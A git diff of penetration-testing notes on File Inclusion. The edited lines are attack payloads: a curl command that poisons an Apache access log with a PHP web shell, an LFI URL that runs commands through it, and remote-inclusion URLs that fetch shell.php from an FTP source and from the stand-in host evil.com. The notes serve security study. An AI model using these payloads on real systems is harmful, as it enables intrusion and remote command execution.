@@ -1,5 +1,5 @@
 ---
-description: Notes about some basic File Insclusion Attack
+description: Notes about some basic File Insclusion attack
 ---
 
 # File Inclusion
@@ -45,10 +45,10 @@ Local File Inclusion (LFI) is a type of vulnerability where an attacker can expl
 
 ```bash
 # Inject Access Log
-curl -X "<?php echo passthru(\$_GET['cmd']);?>" http://localhost/wordpress/
+curl -X "<?php echo passthru(\$_GET['cmd']);?>" http://target.com/
 
 # Access
-index.php?page=/var/log/apache2/access.log&cmd=id
+http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id
 ```
 
 Access Log Location
@@ -84,9 +84,9 @@ In most languages, including remote URLs is considered as a dangerous practice a
 
 {% code overflow="wrap" %}
 ```bash
-http://target.com/index.php?page=/index.php?page=ftp://user:pass@localhost/shell.php&cmd=id
+http://target.com/index.php?page=ftp://user:pass@localhost/shell.php&cmd=id
 
-http://target.com/index.php?page=/index.php?language=http://evil.com/shell.php&cmd=id
+http://target.com/index.php?page=http://evil.com/shell.php&cmd=id
 ```
 {% endcode %}
 
@@ -110,3 +110,7 @@ curl http://target.com/index.php?view=../../../../../../../../../../../../../../
 * https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
 * https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
 * https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
+
+References
+
+* [https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
